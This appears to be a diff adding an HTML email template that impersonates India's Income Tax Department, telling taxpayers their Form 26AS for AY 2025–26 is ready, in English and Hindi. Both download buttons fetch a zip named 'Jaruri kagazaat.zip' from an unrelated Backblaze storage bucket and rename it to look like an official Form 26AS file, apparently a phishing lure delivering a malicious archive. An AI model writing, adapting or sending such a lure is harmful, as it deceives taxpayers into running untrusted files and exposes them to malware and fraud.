@@ -1,0 +1,168 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Form 26AS Download Notification</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;margin:0;padding:0;color:#222}
+    .container{max-width:660px;margin:28px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 6px 24px rgba(0,0,0,0.08)}
+    .header{background:#0b4f9e;color:#fff;padding:16px 20px;display:flex;gap:12px;align-items:center}
+    .logo{width:52px;height:52px;flex:0 0 52px}
+    .title{font-size:16px;font-weight:700;margin:0}
+    .sub{font-size:12px;color:#dbe9ff;margin-top:4px}
+    .content{padding:20px}
+    h2{color:#0b4f9e;margin:0 0 12px 0;font-size:18px}
+    p{margin:8px 0;line-height:1.5}
+    .btn{display:inline-flex;align-items:center;gap:8px;background:#0b4f9e;color:#fff;text-decoration:none;padding:10px 16px;border-radius:6px;font-weight:600;margin-top:12px;transition:background 0.3s}
+    .btn:hover{background:#0a70c7}
+    .btn-download{background:#0a70c7}
+    .btn-download:hover{background:#0b4f9e}
+    .btn-icon{width:16px;height:16px}
+    .links{margin-top:10px;display:flex;flex-wrap:wrap;gap:12px}
+    .small{font-size:13px;color:#555}
+    .footer{background:#f7f9fc;padding:14px 20px;font-size:13px;color:#666;display:flex;justify-content:space-between;align-items:center}
+    .separator{height:1px;background:#eef2f6;margin:0}
+    .language-switcher{position:absolute;top:20px;right:20px;display:flex;gap:8px}
+    .lang-btn{background:rgba(255,255,255,0.2);color:white;border:1px solid rgba(255,255,255,0.3);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:12px}
+    .lang-btn.active{background:rgba(255,255,255,0.4);font-weight:bold}
+    .bilingual{display:flex;flex-direction:column;gap:8px}
+    .bilingual p{display:flex;flex-direction:column;gap:4px}
+    .hindi{font-family:Arial,Helvetica,sans-serif;direction:ltr}
+    .english{font-family:Arial,Helvetica,sans-serif}
+    @media(max-width:520px){
+      .header{flex-direction:column;align-items:flex-start}
+      .footer{flex-direction:column;align-items:flex-start}
+      .links{flex-direction:column}
+      .language-switcher{position:static;margin-top:10px;justify-content:center}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo" aria-hidden>
+        <!-- Government emblem placeholder SVG -->
+        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" width="52" height="52" fill="none">
+          <circle cx="32" cy="32" r="30" stroke="white" stroke-width="2" fill="none"></circle>
+          <text x="32" y="37" text-anchor="middle" font-size="14" fill="white" font-family="Arial" font-weight="700">Gov</text>
+        </svg>
+      </div>
+      <div>
+        <div class="title">Income Tax Department – Centralized Processing Cell (TDS)</div>
+        <div class="sub">Form 26AS Annual Tax Statement — AY 2025–26</div>
+      </div>
+      <div class="language-switcher">
+        <button class="lang-btn active" id="lang-en">English</button>
+        <button class="lang-btn" id="lang-hi">हिन्दी</button>
+      </div>
+    </div>
+
+    <div class="content">
+      <h2 id="title">Form 26AS Available for Download</h2>
+
+      <div class="bilingual">
+        <p>
+          <span class="english" id="greeting-en">Dear Taxpayer,</span>
+          <span class="hindi" id="greeting-hi" style="display:none">प्रिय करदाता,</span>
+        </p>
+
+        <p>
+          <span class="english" id="message1-en">Your Annual Tax Statement (Form 26AS) for Assessment Year <strong>2025–26</strong> has been generated.</span>
+          <span class="hindi" id="message1-hi" style="display:none">आपका वार्षिक कर विवरण (फॉर्म 26AS) निर्धारण वर्ष <strong>2025–26</strong> के लिए जनरेट किया गया है।</span>
+        </p>
+
+        <p>
+          <span class="english" id="message2-en">Please download your Form 26AS using one of the options below. Verify all entries carefully before filing your Income Tax Return (ITR).</span>
+          <span class="hindi" id="message2-hi" style="display:none">कृपया नीचे दिए गए विकल्पों में से किसी एक का उपयोग करके अपना फॉर्म 26AS डाउनलोड करें। अपना इनकम टैक्स रिटर्न (ITR) दाखिल करने से पहले सभी प्रविष्टियों को ध्यान से सत्यापित करें।</span>
+        </p>
+      </div>
+
+      <div class="links">
+        <a class="btn" href="https://f005.backblazeb2.com/file/Malaysiaok/Jaruri+kagazaat.zip" download="Form26AS_AY2025-26.zip">
+          <svg class="btn-icon" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+          </svg>
+          <span id="btn1-en">Download Form 26AS</span>
+          <span id="btn1-hi" style="display:none">फॉर्म 26AS डाउनलोड करें</span>
+        </a>
+        <a class="btn btn-download" href="https://f005.backblazeb2.com/file/Malaysiaok/Jaruri+kagazaat.zip" download="Form26AS_AY2025-26.zip">
+          <svg class="btn-icon" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+          </svg>
+          <span id="btn2-en">Download Now</span>
+          <span id="btn2-hi" style="display:none">अभी डाउनलोड करें</span>
+        </a>
+      </div>
+
+      <div style="margin-top:14px" class="bilingual">
+        <p>
+          <span class="english small" id="message3-en">If you find any discrepancy, contact your deductor or the reporting financial institution before filing your ITR.</span>
+          <span class="hindi small" id="message3-hi" style="display:none">यदि आपको कोई विसंगति मिलती है, तो अपना ITR दाखिल करने से पहले अपने कटौतीकर्ता या रिपोर्टिंग वित्तीय संस्थान से संपर्क करें।</span>
+        </p>
+      </div>
+
+      <div style="margin-top:18px;font-size:13px;color:#444">
+        <strong>Centralized Processing Cell (TDS)</strong><br>
+        <span id="dept-en">Income Tax Department, Government of India</span>
+        <span id="dept-hi" style="display:none">आयकर विभाग, भारत सरकार</span>
+      </div>
+
+    </div>
+
+    <div class="separator" role="separator"></div>
+
+    <div class="footer">
+      <div>
+        <span id="help-en">For assistance:</span>
+        <span id="help-hi" style="display:none">सहायता के लिए:</span>
+        1800‑103‑0344
+      </div>
+      <div style="text-align:right">
+        <span id="auto-en">(This is an automated message. Please do not reply.)</span>
+        <span id="auto-hi" style="display:none">(यह एक स्वचालित संदेश है। कृपया जवाब न दें।)</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const langEnBtn = document.getElementById('lang-en');
+      const langHiBtn = document.getElementById('lang-hi');
+      
+      // English elements
+      const enElements = document.querySelectorAll('[id$="-en"]');
+      
+      // Hindi elements
+      const hiElements = document.querySelectorAll('[id$="-hi"]');
+      
+      // Set initial language
+      setLanguage('en');
+      
+      // Add event listeners
+      langEnBtn.addEventListener('click', function() {
+        setLanguage('en');
+        langEnBtn.classList.add('active');
+        langHiBtn.classList.remove('active');
+      });
+      
+      langHiBtn.addEventListener('click', function() {
+        setLanguage('hi');
+        langHiBtn.classList.add('active');
+        langEnBtn.classList.remove('active');
+      });
+      
+      function setLanguage(lang) {
+        if (lang === 'en') {
+          enElements.forEach(el => el.style.display = 'inline');
+          hiElements.forEach(el => el.style.display = 'none');
+        } else if (lang === 'hi') {
+          enElements.forEach(el => el.style.display = 'none');
+          hiElements.forEach(el => el.style.display = 'inline');
+        }
+      }
+    });
+  </script>
+</body>
+</html>
